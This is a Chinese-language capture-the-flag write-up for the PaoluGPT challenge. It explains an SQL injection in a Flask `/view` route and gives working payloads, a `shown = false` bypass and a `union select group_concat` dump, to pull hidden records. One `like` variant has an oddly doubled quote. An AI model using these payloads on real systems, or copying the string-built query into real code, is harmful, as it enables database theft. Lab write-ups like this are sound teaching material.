# PaoluGPT

`/view` 里将 GET 参数 `conversation_id` 直接拼入 SQL 语句，造成 SQL 注入：

```python
@app.route("/view")
def view():
    conversation_id = request.args.get("conversation_id")
    results = execute_query(
        f"select title, contents from messages where id = '{conversation_id}'"
    )
    return render_template("view.html", message=Message(None, results[0], results[1]))
```

需要注意的是，`execute_query` 函数默认只获取一条记录：

```python
def execute_query(s: str, fetch_all: bool = False):
    conn = sqlite3.connect("file:/tmp/data.db?mode=ro", uri=True)
    cur = conn.cursor()
    res = cur.execute(s)
    if fetch_all:
        return res.fetchall()
    else:
        return res.fetchone()
```

题目作者希望先用爬虫脚本解决第一题「千里挑一」，然后使用 SQL 注入解决第二题「窥视未知」。但如果只用 SQL 注入，应该会更容易解决「窥视未知」，然后才是「千里挑一」。

这是我比赛时的做题顺序，接下来也按照这个顺序，只用 SQL 注入。

## 窥视未知

在 `/list` 中，SQL 查询限制了只显示 `shown = true` 的对话：

```python
results = execute_query(
    "select id, title from messages where shown = true", fetch_all=True
)
```

但在 `/view` 中存在 SQL 注入漏洞，我们可以构造 Payload 绕过这个限制：

```
' or shown = false --
```

这个 Payload 会使 SQL 语句变为：

```sql
select title, contents from messages where id = '' or shown = false --'
```

这样查询条件就从匹配特定 ID 变成了获取所有 `shown = false` 的对话。

由于 `execute_query()` 默认只返回一条记录，所以这个方法仅在隐藏对话只有一篇时有效。

经过测试，数据库中确实只有一篇隐藏对话，其内容底部包含 Flag。

如果数据库中有多篇隐藏对话，那么可以使用 `like` 语句匹配包含 `flag` 的结果：

```
' or shown = false and contents like '%flag%'' --
```

## 千里挑一

构造以下 Payload：

```
' union select 1, group_concat(title, contents) from messages --
```

这个 Payload 会使 SQL 语句变为：

```sql
select title, contents from messages where id = '' 
union
select 1, group_concat(title, contents) from messages --'
```

- 第一个 `select` 由于 id 为空字符串，不会返回任何结果
- `union` 连接了第二个 `select`，它会返回所有对话的内容
- 使用 `group_concat()` 将所有记录合并成一行，这样就能绕过 `execute_query()` 只返回一条记录的限制
- 添加了第一列 `1` 是为了满足 `union` 两边列数相同的要求

执行后会获得数据库中所有对话的标题和内容，在返回的页面中搜索 `flag` 就能同时找到两题的 Flag。
